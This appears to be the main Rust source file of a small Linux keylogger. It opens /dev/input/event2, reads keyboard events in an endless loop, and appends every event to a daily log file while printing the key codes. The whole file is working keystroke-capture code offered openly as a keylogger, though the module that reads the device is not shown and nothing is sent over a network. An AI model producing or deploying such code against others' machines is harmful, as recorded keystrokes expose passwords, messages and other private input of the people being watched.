mod keylogger;

use keylogger::keyLogger;
use std::io::{self, Read};
use chrono::{DateTime, Local};
use std::path::Path;
use std::fs::File;
use std::fs::write;
use std::fs::OpenOptions;
use std::io::prelude::*;

fn main() {
    let mut test = keyLogger::new("/dev/input/event2");

    let current_local: DateTime<Local> = Local::now();
    let custom_format = current_local.format("%Y-%m-%d");

    let logsFileUrl = format!("./src/data/logs/{}.log", custom_format);

    if (!Path::new(logsFileUrl.as_str()).exists()) {
        let mut file = File::create(logsFileUrl.as_str())
            .expect("Error while creating the file");
    }

    let mut logsFile = OpenOptions::new()
        .append(true)
        .open(logsFileUrl.as_str())
        .expect("Error while opening the file");

    loop {
        let event = &mut test.getCurrentEvent();

        logsFile.write_all(format!("{:?}\n", event).as_bytes());

        println!("{:?}", event.code);
    }
}
